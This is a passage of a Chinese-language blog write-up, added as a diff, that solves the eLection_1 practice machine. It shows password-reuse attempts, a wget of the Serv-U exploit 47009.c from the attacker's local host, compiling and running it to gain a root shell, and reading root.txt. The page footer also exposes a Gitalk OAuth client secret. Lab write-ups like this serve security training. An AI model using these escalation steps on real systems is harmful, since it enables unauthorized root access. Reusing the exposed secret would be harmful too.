minutes        | Election is closed. | default  | en-us            |       1 |       2 |       0 |<br>+----+----------+---------------------------+------------------+--------+-----------+----------+-------------+------------------+---------------------+----------+------------------+---------+---------+---------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure>
+
+<p>拿到了一个新的密码，结合数据库链接密码，尝试进行密码碰撞，看看 root 的密码有没有可能是其中之一</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">love@election:/var/www/html/election/admin/inc$ su -<br>Password: <br>su: Authentication failure<br>love@election:/var/www/html/election/admin/inc$ su -<br>Password: <br>su: Authentication failure<br></code></pre></td></tr></table></figure>
+
+<p>失败，看了眼数据库提权，也无法利用，在这里卡了很久，尝试利用数据库中的信息登录网站看看，但是网站连接似乎有点问题，密码提示失败。后续又跑去看了进程和网络连接的状况，均没有收获。而定时任务中也没有信息。</p>
+<h3 id="Serv-U-FTP-Server-提权"><a href="#Serv-U-FTP-Server-提权" class="headerlink" title="Serv-U FTP Server 提权"></a>Serv-U FTP Server 提权</h3><p>卡了许久，最后尝试搜索 SUID 中不熟悉文件的 exploit</p>
+<p><img src="/pic/08e7c92edbdc1bbdfe4c25df468ba650_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现了可能存在的漏洞，将其下载到本地再上传到靶机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">love@election:/tmp$ wget http://192.168.56.106:8088/47009.c<br>--2023-07-15 16:02:13--  http://192.168.56.106:8088/47009.c<br>Connecting to 192.168.56.106:8088... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 588 [text/x-csrc]<br>Saving to: ‘47009.c’<br><br>47009.c                       100%[==============================================&gt;]     588  --.-KB/s    <span class="hljs-keyword">in</span> 0s      <br><br>2023-07-15 16:02:13 (62.5 MB/s) - ‘47009.c’ saved [588/588]<br><br>love@election:/tmp$ gcc 47009.c -o pe &amp;&amp; ./pe<br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)<br>opening root shell<br><span class="hljs-comment"># whoami</span><br>root<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)<br><span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000                          <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00                                                            <br>    inet 127.0.0.1/8 scope host lo                                                                                   <br>       valid_lft forever preferred_lft forever                                                                       <br>    inet6 ::1/128 scope host                                                                                         <br>       valid_lft forever preferred_lft forever                                                                       <br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000                <br>    <span class="hljs-built_in">link</span>/ether 08:00:27:fe:c8:1d brd ff:ff:ff:ff:ff:ff                                                               <br>    inet 192.168.56.128/24 brd 192.168.56.255 scope global dynamic noprefixroute enp0s3                              <br>       valid_lft 516sec preferred_lft 516sec                                                                         <br>    inet6 fe80::321e:9192:79f9:852/64 scope <span class="hljs-built_in">link</span> noprefixroute                                                       <br>       valid_lft forever preferred_lft forever <br><span class="hljs-comment"># cd /root</span><br><span class="hljs-comment"># ls -liah</span><br>total 44K<br>262148 drwx------  6 root root 4.0K Jul 14 19:09 .<br>     2 drwxr-xr-x 24 root root 4.0K Apr  8  2020 ..<br>262347 -rw-------  1 root root   66 May 27  2020 .bash_history<br>262346 drwx------  3 root root 4.0K Apr  8  2020 .cache<br>287891 drwx------  5 root root 4.0K May 27  2020 .config<br>295202 drwx------  3 root root 4.0K Oct 20  2019 .gnupg<br>295197 drwxr-xr-x  3 root root 4.0K Oct 20  2019 .<span class="hljs-built_in">local</span><br>262348 -rw-r--r--  1 root root  148 Aug 17  2015 .profile<br>282877 -rw-r--r--  1 root root   33 Apr  9  2020 root.txt<br>262647 -rw-r--r--  1 root root   66 Apr  2  2020 .selected_editor<br>262149 -rw-r-----  1 root root    5 Jul 14 19:09 .vboxclient-display-svga.pid<br><span class="hljs-comment"># cat root.txt</span><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>eLection_1 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/07/18f5865fb0df.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年7月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/07/d2c1d0d4a738.html" title="Kioptrix 4 靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Kioptrix 4 靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/07/c67b9582251d.html" title="DC-7 靶机">
+                        <span class="hidden-mobile">DC-7 靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '8a2411018c09a1d7d52cf53d946c2726'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
